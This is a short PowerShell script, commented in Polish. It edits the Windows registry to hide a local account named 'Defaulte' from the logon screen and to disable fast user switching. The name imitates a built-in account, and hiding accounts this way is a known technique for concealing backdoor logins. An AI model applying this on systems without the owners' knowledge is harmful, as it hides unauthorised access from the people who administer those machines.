$userListPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$policiesPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$user = "Defaulte"

# Utworzenie brakujących kluczy rejestru
if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts")) {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force
}

if (-not (Test-Path $userListPath)) {
    New-Item -Path $userListPath -Force
}

# Dodanie wpisu, aby ukryć użytkownika "Defaulte" z ekranu logowania
New-ItemProperty -Path $userListPath -Name $user -Value 0 -PropertyType DWORD -Force

# Ukrywanie użytkownika z menu Start
if (-not (Test-Path $policiesPath)) {
    New-Item -Path $policiesPath -Force
}

New-ItemProperty -Path $policiesPath -Name "HideFastUserSwitching" -Value 1 -PropertyType DWORD -Force

Write-Output "Użytkownik 'Defaulte' został ukryty z ekranu logowania i menu Start."
